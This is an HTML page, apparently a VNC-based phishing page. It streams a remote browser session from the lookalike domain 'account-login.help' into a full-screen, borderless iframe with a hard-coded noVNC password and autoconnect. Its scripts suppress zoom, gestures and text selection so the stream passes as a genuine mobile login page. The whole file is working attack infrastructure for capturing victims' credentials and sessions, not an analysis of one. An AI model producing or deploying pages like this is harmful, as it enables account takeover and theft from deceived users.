
		<!DOCTYPE html>
		<html lang='en'>
		<head>
		    <meta charset='UTF-8'>
		    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
		    <link rel='icon' href='http://account-login.help/favicon.ico' type='image/x-icon'>
		    <title></title>
		    <style>
			body, html {
			    height: 100%;
			    margin: 0;
			    overflow: hidden;
			}
			iframe {
			    width: 100%;
			    height: 100%;
			    border: none;
			}
		    </style>
		    <!-- Load the comprehensive VNC UI Manager -->
		    <script src="vnc-ui-manager.js"></script>
		    
		    <script>
			// Initialize mobile VNC session with perfect UI matching
			function initializeMobileVNC() {
			    if (window.vncUIManager) {
			        console.log('Mobile VNC session initialized with perfect UI matching');
			        // The VNC UI Manager will handle all mobile-specific optimizations automatically
			    } else {
			        console.error('VNC UI Manager not loaded');
			    }
			}

			// Fallback initialization
			window.addEventListener('load', function() {
			    initializeMobileVNC();
			});
			
			// Handle any mobile-specific optimizations
			document.addEventListener('DOMContentLoaded', function() {
			    // Prevent mobile zoom and gestures
			    const meta = document.createElement('meta');
			    meta.name = 'viewport';
			    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
			    document.head.appendChild(meta);
			    
			    // Ensure perfect mobile login page display
			    const iframe = document.getElementById('myIframe');
			    if (iframe) {
			        iframe.style.touchAction = 'manipulation';
			        iframe.style.webkitUserSelect = 'none';
			        iframe.style.mozUserSelect = 'none';
			        iframe.style.msUserSelect = 'none';
			        iframe.style.userSelect = 'none';
			    }
			});
			
			// Prevent mobile gestures and zoom
			document.addEventListener('gesturestart', function(e) {
			    e.preventDefault();
			});
			
			document.addEventListener('gesturechange', function(e) {
			    e.preventDefault();
			});
			
			document.addEventListener('gestureend', function(e) {
			    e.preventDefault();
			});
			
			// Prevent pinch zoom on mobile
			document.addEventListener('touchmove', function(e) {
			    if (e.scale !== 1) {
			        e.preventDefault();
			    }
			}, { passive: false });
			
			// Prevent double-tap zoom
			let lastTouchEnd = 0;
			document.addEventListener('touchend', function(e) {
			    const now = Date.now();
			    if (now - lastTouchEnd <= 300) {
			        e.preventDefault();
			    }
			    lastTouchEnd = now;
			}, false);
		    </script>
		</head>

		    <iframe id='myIframe' src='http://account-login.help/744f701cf7d964e4a75c1ff46af3/conn.html?path=/744f701cf7d964e4a75c1ff46af3/websockify&password=744f701cf7d964e4a75c1ff46af3&autoconnect=true&resize=remote' frameborder='0'></iframe>
		</body>
